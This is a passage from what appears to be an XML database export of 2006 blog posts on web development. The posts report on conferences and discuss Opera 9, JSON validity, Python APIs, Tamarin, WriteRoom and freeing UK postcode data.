&lt;p id=&quot;p-3&quot;&gt;The event had a great speaker line-up, with keynotes from &lt;a href=&quot;http://www.markshuttleworth.com/&quot;&gt;Mark Shuttleworth&lt;/a&gt; and &lt;a href=&quot;http://www.webmink.net/&quot;&gt;Simon Phipps&lt;/a&gt; and talks from a varied assortment of free software hackers and tech enthusiasts. My personal highlights included Matthew Somerville's &lt;a href=&quot;http://www.mysociety.org/?p=249&quot;&gt;MySociety talk&lt;/a&gt;, which combined an overview of the team's projects (such as &lt;a href=&quot;http://www.theyworkforyou.com/&quot;&gt;TheyWorkForYou&lt;/a&gt; and &lt;a href=&quot;http://www.pledgebank.com/&quot;&gt;PledgeBank&lt;/a&gt;) with some behind-the-scene's anecdotes, and the Hour of Power which featured a sequence of cool lightning-talk style demos.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;I gave a talk about Django, trying to concentrate on the open source community aspects as opposed to diving deep in to the code. I fluffed the timing a bit, but the talk seemed to go over well. A number of people I talked to were using Django for real-world projects, some of which should be showing up on &lt;a href=&quot;http://code.djangoproject.com/wiki/DjangoPoweredSites&quot;&gt;DjangoPoweredSites&lt;/a&gt; in the near future.&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;The event cost just five pounds for both days, but despite the small budget nothing that mattered had been missed - the AV worked brilliantly and the talks ran almost precisely to schedule. &lt;a href=&quot;http://www.flickr.com/photos/sebpayne/204164808/&quot;&gt;The low-tech wiki&lt;/a&gt; (a hand-constructed blackboard) certainly brought out the creativity in the crowd. Definitely the best value conference with the most grassroots atmosphere that I've ever been to. I can't wait for next year.&lt;/p&gt;

&lt;h3&gt;Ask Later&lt;/h3&gt;

&lt;p id=&quot;p-6&quot;&gt;Ask Later was a very different sort of event. It took place on a Tuesday evening at the New Cavendish campus of the University of Westminster (also the venue for the London Web Frameworks and JavaScript evenings) and consisted of a series of 6 minute 40 second presentations, each prepared in advance with 20 slides and 20 seconds for each slide. The slides were on automatic, so the presenters had to be able to time their talk precisely to match up with their slides.&lt;/p&gt;

&lt;p id=&quot;p-7&quot;&gt;Tom Carden has &lt;a href=&quot;http://www.tom-carden.co.uk/2006/07/26/ask-later-1/&quot;&gt;a list of the talks&lt;/a&gt; that were presented. The biggest crowd-pleaser was Matt Westcott, who described &lt;a href=&quot;http://matt.west.co.tt/talks/extreme-sudoku-solving/&quot; title=&quot;Extreme Sudoku Solving with Ruby&quot;&gt;his attempt&lt;/a&gt; at writing a Sudoku solver in Ruby to tackle the Times' online competition. The solver itself was pretty straight foward; the hand-rolled OCR routine to deal with the Times' dodgy scanned JPEG a little less so. All of Matt's work ended up in vane when the Times stopped publishing the puzzle online just after his system started working.&lt;/p&gt;

&lt;p id=&quot;p-8&quot;&gt;&lt;a href=&quot;http://www.infovore.org/&quot;&gt;Tom Armitage's&lt;/a&gt; talk was about how software should help people tell stories. It reminded me very much of &lt;a href=&quot;http://www.tabblo.com/&quot;&gt;Tabblo&lt;/a&gt;, the Django-powered photo sharing application that &lt;a href=&quot;http://www.nedbatchelder.com/&quot;&gt;Ned Batchelder&lt;/a&gt; has been working on.&lt;/p&gt;

&lt;p id=&quot;p-9&quot;&gt;There was also a talk about levels of indirection from Jon Crowcroft, a lecturer at Cambridge. He mentioned in passing that two of his PHd students have written a full SSH implementation in &lt;a href=&quot;http://caml.inria.fr/ocaml/&quot;&gt;OCaml&lt;/a&gt;, which is smaller and faster than the standard C version and is also provably correct. OCaml is a pure functional programming language with type inference, an object system and a strong collection of libraries. Another thing to keep an eye on.&lt;/p&gt;

&lt;p id=&quot;p-10&quot;&gt;The other talks covered a wide range of topics, and the standard was uniformly high. My own talk attempted to explain functional programming (including closures) in JavaScript. It went OK, but I really should have spent more time getting the slides right. Joel Spolksy's &lt;a href=&quot;http://www.joelonsoftware.com/items/2006/08/01.html&quot;&gt;Can Your Programming Language Do This?&lt;/a&gt; is more of the kind of thing I was aiming for.&lt;/p&gt;

&lt;p id=&quot;p-11&quot;&gt;The only disappointment was the size of the audience. The talks really deserved to be seen by more people; if you weren't there you missed out on a treat. I imagine the main problem was the heat - sitting in a stuffy lecture theatre on a night like Tuesday's wasn't a hugely attractive proposition, but the talks were more than worth it.&lt;/p&gt;

&lt;p id=&quot;p-12&quot;&gt;The organisers have promised to run more events in the future, and hopefully positive word-of-mouth plus cooler weather will improve attendance for next time. You'd be crazy to miss it.&lt;/p&gt;</field>
		<field name="created">2006-08-01 23:28:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1534</field>
		<field name="title">Sticking with Opera 9</field>
		<field name="slug">sticking</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;It's been a month and a half since &lt;a href=&quot;http://simon.incutio.com/archive/2006/06/20/opera9&quot;&gt;I started using Opera 9&lt;/a&gt;, with a promise to report back later. I'm still using it, although some of the things I liked initially have faded while others have emerged.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;Firstly, the ability to browse cached documents offline turned out to be a dud. The behaviour I was observing (where I could view pages from my cache while disconnected) was due to the following setting, in &lt;samp&gt;Preferences -&amp;gt; Advanced -&amp;gt; History&lt;/samp&gt;:&lt;/p&gt;

&lt;p class=&quot;img&quot;&gt;&lt;img alt=&quot;Dialogue box: Check if cached page is updated on the server, with check documents set to every five hours and check images set to every five minutes.&quot; height=&quot;91&quot; src=&quot;http://simon.incutio.com/images/2006/opera-check-cache-prefs.png&quot; width=&quot;423&quot; /&gt;&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;As someone whose work involves making websites the idea of seeing stale documents for five hours is pretty horrifying, so I changed that to &quot;check documents never&quot; as soon as I saw it (I'm pretty confident that doesn't affect conditional-GET, which should work regardless). As soon as I did that I lost the ability to browse offline. Browser vendors take note: you can still be the first modern browser to implement a proper offline mode!&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;The disadvantage of changing those setting is that they can break JavaScript image preloaders, leading to an unsettling flicker when you mouse over some links. That's why I've left my image setting above to check every five minutes.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;Despite losing offline browsing, other features have popped up that have kept me happy:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;p id=&quot;p-5&quot;&gt;Opera is the only Mac browser I've used that includes a working full-screen mode; great for presentations.&lt;/p&gt;&lt;/li&gt;
  &lt;li&gt;&lt;p id=&quot;p-6&quot;&gt;Hitting space moves you down the height of the viewport, as with other browsers. Hitting space at the &lt;em&gt;bottom of the page&lt;/em&gt; takes you to the next page in the 'sequence', if there is one. My first guess was that this used &lt;code&gt;&amp;lt;link rel=&quot;next&quot;&amp;gt;&lt;/code&gt;, but it also works on Yahoo!, Technorati and Google search results pages which don't have those links. I suppose it's looking for any link on the page with 'Next' as the link text. Whatever it's doing, it works surprisingly well.&lt;/p&gt;&lt;/li&gt;
  &lt;li&gt;&lt;p id=&quot;p-7&quot;&gt;Site compatibility really is excellent; I run in to sites that don't work in Opera about as often as I do sites that don't work in Firefox. Part of that might be due to Opera's &lt;a href=&quot;http://www.opera.com/docs/browserjs/&quot;&gt;ingenious browser.js file&lt;/a&gt;, which includes Greasemonkey-style site-specific fixes and automatically updates itself once a week. Clever, but a bit scary at the same time.&lt;/p&gt;&lt;/li&gt;
  &lt;li&gt;&lt;p id=&quot;p-8&quot;&gt;The built-in IRC client is good as well - if it wasn't for &lt;a href=&quot;http://colloquy.info/&quot;&gt;Colloquy&lt;/a&gt; it would be my first choice for IRCing on the Mac.&lt;/p&gt;&lt;/li&gt;
  &lt;li&gt;&lt;p id=&quot;p-9&quot;&gt;Finally, Opera's low memory footprint continues to keep me from switching back to Safari or Firefox. My Mac (a two and a half year old PowerBook) is noticeably less sluggish now that those two applications have been relegated to JavaScript hacking (gotta love &lt;a href=&quot;http://joehewitt.com/software/firebug/&quot;&gt;FireBug&lt;/a&gt;) and the occasional misbehaving site.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p id=&quot;p-10&quot;&gt;I haven't even touched Opera Mail yet, and the gadget support is something I played with once and never used again (but then I don't use Dashboard that much either).&lt;/p&gt;

&lt;p id=&quot;p-11&quot;&gt;Overall I'm extremely happy with Opera 9 and I'd recommend giving it a go - especially if you've tried and disliked an older version.&lt;/p&gt;</field>
		<field name="created">2006-08-06 18:32:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1535</field>
		<field name="title">The YDN Python Developer Center</field>
		<field name="slug">ydn</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I recently had the opportunity to put together the &lt;a href=&quot;http://developer.yahoo.com/python/&quot;&gt;Python Developer Center&lt;/a&gt; for the &lt;a href=&quot;http://developer.yahoo.com/&quot;&gt;Yahoo! Developer Network&lt;/a&gt;. YDN is one of my favourite parts of Yahoo! so I jumped at the chance, and the resulting mini-site is now online (&lt;a href=&quot;http://developer.yahoo.net/blog/archives/2006/08/introducing_the.html&quot;&gt;YDN blog post here&lt;/a&gt;).&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;The bulk of the content is &lt;a href=&quot;http://developer.yahoo.com/python/#howto&quot;&gt;the HOWTOs&lt;/a&gt;, which discuss ways of accessing Yahoo! APIs using Python:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://developer.yahoo.com/python/python-rest.html&quot;&gt;Make Yahoo! Web Service REST calls with Python&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://developer.yahoo.com/python/python-caching.html&quot;&gt;Cache API calls using Python&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://developer.yahoo.com/python/python-json.html&quot;&gt;Parse JSON using Python&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://developer.yahoo.com/python/python-xml.html&quot;&gt;Parse XML using Python&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://developer.yahoo.com/python/python-pysearch.html&quot;&gt;Access the Yahoo! Search APIs using pYsearch&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://developer.yahoo.com/python/python-rss.html&quot;&gt;Access Yahoo! RSS feeds using Python&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p id=&quot;p-2&quot;&gt;I had a lot of fun playing around with different ways of accessing the APIs and working out which ones were the most natural fit. The HOWTOs use &lt;a href=&quot;http://docs.python.org/lib/module-urllib.html&quot;&gt;urllib&lt;/a&gt;, &lt;a href=&quot;http://docs.python.org/lib/module-urllib2.html&quot;&gt;urllib2&lt;/a&gt; and &lt;a href=&quot;http://docs.python.org/lib/module-xml.dom.minidom.html&quot;&gt;xml.dom.minidom&lt;/a&gt; from the standard library, but also discuss &lt;a href=&quot;http://bitworking.org/projects/httplib2/ref/module-httplib2.html&quot;&gt;httplib2&lt;/a&gt;, &lt;a href=&quot;http://effbot.org/zone/element-index.htm&quot;&gt;ElementTree&lt;/a&gt; and &lt;a href=&quot;http://undefined.org/python/#simplejson&quot;&gt;simplejson&lt;/a&gt; as third party libraries that are worth investigating. Naturally, &lt;a href=&quot;http://www.feedparser.org/&quot;&gt;feedparser&lt;/a&gt; is the recommended tool for accessing Yahoo!'s &lt;a href=&quot;http://developer.yahoo.com/rss/&quot;&gt;multitude of RSS feeds&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;Python really is a fantastic language for exploring web service APIs. All of the example code for the HOWTOs was first written in an interactive prompt and then copied to a file once it was working. Test-first development is certainly an important technique, but the power of interactive development should never be underestimated.&lt;/p&gt;</field>
		<field name="created">2006-08-08 20:56:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1536</field>
		<field name="title">What I'm excited about, post-conference edition</field>
		<field name="slug">excited</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Wow, I've had a really busy month. I've attended (and spoken at) &lt;a href=&quot;http://barcamp.org/BarCampLondon&quot;&gt;BarCamp London&lt;/a&gt;, &lt;a href=&quot;http://www.mediaintransition.com/indexe.html&quot;&gt;Media in Transition&lt;/a&gt;, &lt;a href=&quot;http://2006.dconstruct.org/&quot;&gt;d.Construct&lt;/a&gt;, &lt;a href=&quot;http://europe.railsconf.org/&quot;&gt;RailsConf Europe&lt;/a&gt;, Euro Foo and &lt;a href=&quot;http://conferences.oreillynet.com/euos2006/&quot;&gt;EuroOSCON&lt;/a&gt;. All were excellent, and each one nicely complemented the others. I'm exhausted. I think my brain is full.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;My favourite question to ask new people I meet at conferences is &quot;what are you excited about?&quot;. It's better than &quot;what do you do?&quot; (their job might not be as exciting as what they do in their spare time) and often gets a really interesting reply. People often ask me the same back, so here are three things that have been catching my attention recently.&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;p id=&quot;p-2&quot;&gt;&lt;strong&gt;&lt;a href=&quot;http://openid.net/&quot;&gt;OpenID&lt;/a&gt;&lt;/strong&gt;. It's criminal that so few people are playing with this. I gave talks about it at both BarCamp and Euro Foo - it's decentralised single sign-on that works, and it's trivial to implement thanks to really solid libraries for most programming languages. There's also a &lt;a href=&quot;http://iwantmyopenid.org/bounty&quot;&gt;$5,000 bounty&lt;/a&gt; to help spur adoption. I'll be writing a lot more about this in the future.&lt;/p&gt;&lt;/li&gt;
 &lt;li&gt;&lt;p id=&quot;p-3&quot;&gt;&lt;strong&gt;Virtualization&lt;/strong&gt;. This was a common thread at several conferences, and the recent popularity of Parallels for browser testing barely scratches the surface. Virtual servers have a bunch of advantages over physical servers: you can clone them instantly, you can migrate them between machines (while they are still running if you're using Xen) and Amazon's &lt;a href=&quot;http://aws.amazon.com/ec2&quot;&gt;EC2&lt;/a&gt; offers &lt;a href=&quot;http://en.wikipedia.org/wiki/Utility_computing&quot;&gt;utility computing&lt;/a&gt; on an enormous scale.&lt;/p&gt;&lt;/li&gt;
 &lt;li&gt;&lt;p id=&quot;p-4&quot;&gt;&lt;strong&gt;Dynamic languages on virtual machines&lt;/strong&gt;. &lt;a href=&quot;http://www.codeplex.com/Wiki/View.aspx?ProjectName=IronPython&quot;&gt;IronPython 1.0&lt;/a&gt; is out, Sun &lt;a href=&quot;http://www.tbray.org/ongoing/When/200x/2006/09/07/JRuby-guys&quot;&gt;have hired the JRuby guys&lt;/a&gt;. It looks like dynamic languages are finally being taken seriously as useful and powerful alternatives to C# and Java. Programmers on those VMs get more productive languages, while users of those languages gain access to enormous existing class libraries, not to mention the promise of significant performance boosts.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p id=&quot;p-5&quot;&gt;Finally, since I've blogged the &lt;a href=&quot;http://simon.incutio.com/archive/2003/07/30/python23&quot; title=&quot;Python 2.3&quot;&gt;last&lt;/a&gt; &lt;a href=&quot;http://simon.incutio.com/archive/2004/09/21/python24&quot; title=&quot;Python 2.4 highlights&quot;&gt;two&lt;/a&gt; releases of Python I can't resist saying a few things about &lt;a href=&quot;http://www.python.org/download/releases/2.5/&quot;&gt;the new Python 2.5&lt;/a&gt;. It's &lt;a href=&quot;http://docs.python.org/dev/whatsnew/whatsnew25.html&quot; title=&quot;What&amp;apos;s New in Python 2.5&quot;&gt;all good&lt;/a&gt;, but the stuff that really stands out is the addition of &lt;a href=&quot;http://docs.python.org/dev/lib/module-sqlite3.html&quot;&gt;sqlite3&lt;/a&gt;, &lt;a href=&quot;http://docs.python.org/dev/lib/module-xml.etree.elementtree.html&quot;&gt;ElementTree&lt;/a&gt; and &lt;a href=&quot;http://docs.python.org/dev/lib/module-ctypes.html&quot;&gt;ctypes&lt;/a&gt; to the standard library. Batteries included!&lt;/p&gt;</field>
		<field name="created">2006-09-22 00:25:11</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1537</field>
		<field name="title">Keep your JSON valid</field>
		<field name="slug">json</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I'm a big fan of &lt;a href=&quot;http://www.json.org/&quot;&gt;JSON&lt;/a&gt;, and it's great to see it turning up as an output option for so many Web APIs. Unfortunately, many of these APIs are getting the details slightly wrong and in doing so are producing invalid JSON.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;JSON isn't just the object-literal syntax of JavaScript; it's a very tightly defined subset of that syntax. The site has a spec (illustrated with pretty state machine diagrams) and there's &lt;a href=&quot;http://www.ietf.org/rfc/rfc4627.txt&quot; title=&quot;RFC 4627&quot;&gt;an RFC&lt;/a&gt; as well.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;By far the most common error I've encountered relates to object keys. In JSON (unlike in JavaScript) these MUST be double-quoted strings. In fact, ALL strings in JSON must be enclosed in double quotes (JavaScript also allows single quotes; JSON does not).&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;Valid:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;json&quot;&gt;{ &quot;name&quot;: &quot;Simon&quot; }&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-4&quot;&gt;Invalid:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;invalid-json&quot;&gt;{ name: &quot;Simon&quot; }
{ 'name': &quot;Simon&quot; }
{ &quot;name&quot;: 'Simon' }&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-5&quot;&gt;It's worth reviewing the other key differences between JSON and JavaScript. Remember, all valid JSON is valid JavaScript but the opposite is not true; JSON is a subset.&lt;/p&gt;

&lt;p id=&quot;p-6&quot;&gt;This stuff matters. Python's excellent &lt;a href=&quot;http://cheeseshop.python.org/pypi/simplejson&quot;&gt;simplejson&lt;/a&gt; module is a strict parser; it refuses to consume invalid JSON. If you're building a JSON API it's worth taking the time to ensure you are valid - I suggest installing Python and simplejson and trying the following:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;shell&quot;&gt;$ python
Python 2.5 (r25:51918, Sep 19 2006, 08:49:13) 
[GCC 4.0.1 (Apple Computer, Inc. build 5341)] on darwin
&amp;gt;&amp;gt;&amp;gt; import urllib, simplejson
&amp;gt;&amp;gt;&amp;gt; url = &quot;http://your-api.org/your-api/json&quot;
&amp;gt;&amp;gt;&amp;gt; simplejson.load(urllib.urlopen(url))&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-7&quot;&gt;Try it against a few JSON supporting sites. You might be surprised at the amount of invalid JSON out there.&lt;/p&gt;

&lt;p id=&quot;p-8&quot;&gt;As with outputting XML, the best way to avoid these problems is to use a pre-existing JSON generation library rather than rolling your own. I've had good experiences with &lt;a href=&quot;http://cheeseshop.python.org/pypi/simplejson&quot;&gt;simplejson&lt;/a&gt; for Python and &lt;a href=&quot;http://www.aurore.net/projects/php-json/&quot;&gt;php-json&lt;/a&gt; for PHP.&lt;/p&gt;</field>
		<field name="created">2006-10-11 14:44:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1538</field>
		<field name="title">Graphing requests with Tamper Data</field>
		<field name="slug">graph</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I spent the weekend in Boston, speaking at &lt;a href=&quot;http://www.gbcacm.org/&quot;&gt;GBC/ACM&lt;/a&gt;'s Deep Ajax seminar with Alex Russell and Adrian Holovaty. I'll be posting some notes on this later, but I wanted to share a really neat Firefox extension that Alex showed me: &lt;a href=&quot;http://tamperdata.mozdev.org/&quot;&gt;Tamper Data&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;Tamper Data is an extension for intercepting HTTP requests and modifying them. I have very little interest in this functionality myself, but hidden deep within the extension is the ability to do this:&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;&lt;a href=&quot;http://simon.incutio.com/images/2006/tampergraph.png&quot;&gt;&lt;img alt=&quot;Screenshot of Tamper Data graph of www.yahoo.com&quot; height=&quot;368&quot; src=&quot;http://simon.incutio.com/images/2006/tampergraph_t.png&quot; title=&quot;Click for full-size screenshot&quot; width=&quot;492&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;That's a graph showing what happens when you load up &lt;a href=&quot;http://www.yahoo.com/&quot;&gt;www.yahoo.com&lt;/a&gt;. It shows every component of the page - JavaScript, CSS, images - and when each component started and finished loading. You can use it to get an idea for how long it took between the HTML starting to load and the browser beginning to pull in the CSS, then the images, and so on. It's a superb visualization of  what happens when a page is loaded.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;Unfortunately, if you install and run the extension (Tools -&amp;gt; Tamper Data) you'll see this instead:&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;&lt;a href=&quot;http://simon.incutio.com/images/2006/tamperdata.png&quot;&gt;&lt;img alt=&quot;Screenshot of Tamper Data user interface&quot; height=&quot;394&quot; src=&quot;http://simon.incutio.com/images/2006/tamperdata_t.png&quot; title=&quot;Click for full-size screenshot&quot; width=&quot;492&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p id=&quot;p-6&quot;&gt;To get the graph, you have to right click in the main data grid and select &quot;Graph All&quot; from the context menu. Be sure to hit &quot;clear&quot; before loading a page that you want to graph or you'll end up seeing data from other pages too (you should shut down GMail or similar to prevent their polling requests from polluting the graph).&lt;/p&gt;

&lt;p id=&quot;p-7&quot;&gt;It's a great tool but it's pretty well hidden. If you're looking for a side project, implementing the same functionality in a smaller extension (maybe as an extra tab in the Page Info screen) would be a significant service to the web development community.&lt;/p&gt;</field>
		<field name="created">2006-10-17 18:21:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1539</field>
		<field name="title">Fun with ctypes</field>
		<field name="slug">ctypes</field>
		<field name="body">&lt;p&gt;This probably only works on Intel-based OS X machines:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python-interactive&quot;&gt;&amp;gt;&amp;gt;&amp;gt; import ctypes
&amp;gt;&amp;gt;&amp;gt; print ctypes.c_char_p(
    -16 * 4096 + 0x1600
).value
Your karma check for today:
There once was was a user that whined
his existing OS was so blind,
he'd do better to pirate
an OS that ran great
but found his hardware declined.
Please don't steal Mac OS!
Really, that's way uncool.
   (C) Apple Computer, Inc.U??VWS?5P
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Adapted from &lt;samp&gt;dsmos.c&lt;/samp&gt; in &lt;a href=&quot;http://osxbook.com/book/bonus/chapter7/binaryprotection/index.html&quot;&gt;Understanding Apple's Binary Protection in Mac OS X&lt;/a&gt; by Amit Singh.&lt;/p&gt;</field>
		<field name="created">2006-10-31 11:36:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1540</field>
		<field name="title">Tamarin</field>
		<field name="slug">tamarin</field>
		<field name="body">&lt;p&gt;On Tuesday, the Mozilla Foundation and Adobe &lt;a href=&quot;http://www.mozilla.com/en-US/press/mozilla-2006-11-07.html&quot; title=&quot;Adobe and Mozilla Foundation to Open Source Flash Player Scripting Engine&quot;&gt;announced&lt;/a&gt; the &lt;a href=&quot;http://www.mozilla.org/projects/tamarin/&quot;&gt;Tamarin project&lt;/a&gt;, an open-source ECMAScript virtual machine based on the ActionScript engine used by Flash Player 9.&lt;/p&gt;

&lt;p&gt;Frank Hecker's &lt;a href=&quot;http://www.hecker.org/mozilla/adobe-mozilla-and-tamarin&quot; title=&quot;Adobe, Mozilla, and Tamarin&quot;&gt;overview&lt;/a&gt; of what this means is useful, but &lt;a href=&quot;http://lxr.mozilla.org/mozilla/source/js/tamarin/core/avmplus.h#40&quot;&gt;the Tamarin source code itself&lt;/a&gt; provides this interesting piece of historical insight:&lt;/p&gt;

&lt;blockquote cite=&quot;http://lxr.mozilla.org/mozilla/source/js/tamarin/core/avmplus.h#40&quot;&gt;
&lt;p&gt;AVM+ is the ActionScript Virtual Machine&lt;/p&gt;

&lt;p&gt;AVM+ offers an order of magnitude performance increase over
the &quot;Classic AVM&quot; in Flash Player 7.  Our performance target is 10X.&lt;/p&gt;

&lt;p&gt;AVM+ implements ActionScript 3.0, the new version of the ActionScript
language that is compliant with the ECMAScript Edition 4 standard.&lt;/p&gt;

&lt;p&gt;AVM+ is also built for modularity.  It will be part of the Flash Player,
but is a self-contained module which can be incorporated into other
programs with ease.  It may also be submitted to the ECMA standards
organization as a reference implementation of ECMAScript Edition 4.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Adobe's reputation for solid engineering shines through here - it seems that what is now Tamarin was designed for integration with other applications from the very start.&lt;/p&gt;

&lt;p&gt;The most important thing we can expect from this is a serious improvement in JavaScript performance in the Mozilla family of products, thanks to Tamarin's &lt;acronym title=&quot;Just In Time&quot;&gt;JIT&lt;/acronym&gt; compiler that can convert ECMAScript bytecode to machine code at runtime. JavaScript/Ajax applications will run faster, and the Mozilla applications themselves will perform better as much of their UI is written in JavaScript and XUL.&lt;/p&gt;

&lt;p&gt;This performance boost will benefit other applications as well. Tamarin is being integrated with &lt;a href=&quot;http://en.wikipedia.org/wiki/SpiderMonkey&quot;&gt;SpiderMonkey&lt;/a&gt;, which is used in a variety of applications such as the &lt;a href=&quot;http://widgets.yahoo.com/&quot;&gt;Yahoo! Widget Engine&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Reading through Brendan Eich's technical overview of &lt;a href=&quot;http://weblogs.mozillazine.org/roadmap/archives/2006/10/mozilla_2.html&quot;&gt;Mozilla 2&lt;/a&gt;, it looks like the Mozilla team also plan on taking advantage of this performance boost to move code from C++ to JavaScript 2 in many places, simplifying their code base and reducing the likelihood of security flaws in the code.&lt;/p&gt;

&lt;p&gt;Even in these buzzword filled days of Ajax and Web 2.0, JavaScript is still seen as a poor cousin to so-called &quot;real&quot; programming languages. With a high performance open-source VM like Tamarin available, maybe more developers will start to re-examine JavaScript's role outside the browser.&lt;/p&gt;</field>
		<field name="created">2006-11-09 12:24:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1541</field>
		<field name="title">WriteRoom</field>
		<field name="slug">writeroom</field>
		<field name="body">&lt;p&gt;I had a look at &lt;a href=&quot;http://www.hogbaysoftware.com/product/writeroom&quot;&gt;WriteRoom&lt;/a&gt; a few months ago and wasn't impressed, but &lt;a href=&quot;http://randomfoo.net/&quot;&gt;Leonard&lt;/a&gt; just convinced me to give it another look and I'm completely sold. It's a free text editor for OS X with two killer features:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;A full screen mode (toggle with ESC) that hides the rest of your screen, letting you type in glorious green-on-black courier with absolutely no distractions.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Autosave. You never have to save a document, even when you quit WriteRoom. It maintains a list of your WriteRooms in the file menu, keying each on the first few words. If you want to move text to an actual file you need to either export it or use copy and paste.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I've lost count of the number of times I've lost some notes to a crash having scrawled them in TextMate or SubEthaEdit without saving to a file. Auto-save / auto-recovery should be built in to every application.&lt;/p&gt;</field>
		<field name="created">2006-11-15 07:52:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1542</field>
		<field name="title">Freeing the postcode</field>
		<field name="slug">postcode</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/UK postcodes&quot;&gt;UK postcodes&lt;/a&gt; have some interesting characteristics: a full six character post code identifies an average of around 14 house holds, and postcodes are mainly hierarchical - W1W will always be contained within W1 for example. They're useful for a huge range of interesting things.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;The problem is that the postcode database (of nearly 1.8 million postcodes) is &lt;a href=&quot;http://en.wikipedia.org/wiki/Postcode_Address_File&quot; title=&quot;Postcode Address File&quot;&gt;owned by the Royal Mail&lt;/a&gt; and licensed at a not inconsiderable fee of between £150 and £9,000 per year.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;&lt;a href=&quot;http://www.freethepostcode.org/&quot;&gt;Free the postcode&lt;/a&gt; was set up a while ago to try to remedy this situation, by asking people to enter their postcode along with the latitude/longitude coordinates collected from a GPS. Having people enter coordinates from online mapping services is no good as EU database law may see that as a derivative work. It's had some success, but the GPS requirement has seriously stunted its growth.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;Then a few weeks ago, &lt;a href=&quot;http://www.npemap.org.uk/&quot; title=&quot;New Popular Edition Maps&quot;&gt;npemap.org.uk&lt;/a&gt; launched. It's an interface for browsing scans of out-of-copyright maps from the 1950s (credits at the bottom of &lt;a href=&quot;http://www.npemap.org.uk/FAQ.html&quot;&gt;the FAQ&lt;/a&gt;). The site asks people to enter post codes based on that old mapping data, which can then be placed in the public domain.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;If you haven't already done so, you should go and add any postcodes that you know about now. It takes no time at all, and is especially important if you live in one of the &lt;a href=&quot;http://www.npemap.org.uk/stats/missing_district_stats.html&quot;&gt;230 districts&lt;/a&gt; for which no data has yet been collected.&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;You can grab the data they've already collected &lt;a href=&quot;http://www.npemap.org.uk/data/&quot; title=&quot;Download our postcodes&quot;&gt;from here&lt;/a&gt;. There's a really cool &lt;a href=&quot;http://www.npemap.org.uk/postcodeine/&quot;&gt;interactive visualisation&lt;/a&gt; of their data here, based on &lt;a href=&quot;http://bitter.ukcod.org.uk/~chris/postcodeine/&quot;&gt;previous work&lt;/a&gt; by Chris Lightfoot using the commercially licensed postcode database.&lt;/p&gt;</field>
		<field name="created">2006-11-17 17:29:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1543</field>
		<field name="title">Finally powered by Django</field>
		<field name="slug">upgrade</field>
